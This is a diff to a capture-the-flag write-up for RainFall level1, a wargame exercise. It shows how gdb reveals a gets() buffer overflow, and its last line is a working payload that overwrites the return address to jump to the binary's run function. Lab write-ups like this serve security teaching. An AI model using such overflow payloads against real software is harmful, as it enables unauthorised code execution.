@@ -26,7 +26,6 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
 level1@RainFall:~$ ls
 level1
-level1@RainFall:~$ XXX: put in ls -l
 ```
 
 Let's run this and see what this does.
@@ -43,7 +42,7 @@ aaa
 level1@RainFall:~$
 ```
 
-It does nothing, so let's run gdb to see what's going on.
+It does nothing, so let's run `gdb` to see what's going on.
 
 ```
 level1@RainFall:~$ gdb level1
@@ -131,7 +130,7 @@ Never use gets(). Because it is impossible to tell without knowing the data in a
 
 This means we can use a buffer overflow attack to modify the memory on the stack to "return" to the `run` function at the end of the main function. To do this, we'll need to figure out the location of `run` in memory and put that in the `eip` register.
 
-In `main`, the whole stack frame is allocated with a size of `0x50` (80 in decimal). Note that this includes both the stack frame as well as any memory allocated, in this case 64 (XXX: check) bytes for the `gets` buffer.
+In `main`, the whole stack frame is allocated with a size of `0x50` (80 in decimal). Note that this includes both the stack frame as well as any memory allocated, in this case 64 bytes for the `gets` buffer.
 
 ```
    0x08048480 <+0>:     push   ebp
@@ -182,7 +181,7 @@ Stopped reason: SIGSEGV
 gdb-peda$
 ```
 
-If we replace the last `AAAAAAAA` with the address of the function `run`, instead of a segmentation fault caused from invalid return address, the run function will be executed.
+If we replace the last `AAAA` with the address of the function `run`, instead of a segmentation fault caused from invalid return address, the run function will be executed.
 
 ```
 level1@RainFall:~$ (python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat -) | ./level1
